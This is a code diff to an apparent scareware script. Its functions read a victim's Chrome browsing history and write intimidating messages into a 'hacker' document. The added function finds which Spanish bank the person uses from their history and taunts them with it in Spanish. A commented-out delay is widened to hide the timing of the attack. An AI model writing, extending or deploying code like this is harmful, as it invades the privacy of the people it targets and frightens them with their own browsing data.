@@ -50,9 +50,23 @@ def scare_user_with_youtube(hacker_doc, chrome_history):
                      .format(len(profiles_visited), ", ".join(profiles_visited)))
 
 
+def scare_user_with_banks(hacker_doc, chrome_history):
+    banks = ["BBVA", "Caixabank", "Santander", "Bankia", "Sabadell", "Abanca", "Unicaja", "Kutxobank", "Ibercaja"]
+    bank = None
+    hacker_doc.write("\n")
+    for url in chrome_history[:1000]:
+        for b in banks:
+            if b.lower() in url[0].lower():
+                bank = b
+                break
+        if bank:
+            break
+    hacker_doc.write("He visto que eres del banco: {}".format(bank))
+
+
 """def delay():
-    n_hours = random.randrange(1, 2)
-    n_min = random.randrange(1, 2)
+    n_hours = random.randrange(1, 3)
+    n_min = random.randrange(1, 60)
     print("Dormiremos {} horas y  {} minutos".format(n_hours, n_min))
     time.sleep((n_hours * 60 * 60) + (n_min * 60))"""
 
@@ -70,6 +84,7 @@ def main():
     chrome_history = get_chrome_data(user_path)
     scare_user_with_twitter(hacker_doc, chrome_history)
     scare_user_with_youtube(hacker_doc, chrome_history)
+    scare_user_with_banks(hacker_doc, chrome_history)
 
 
 if __name__ == "__main__":
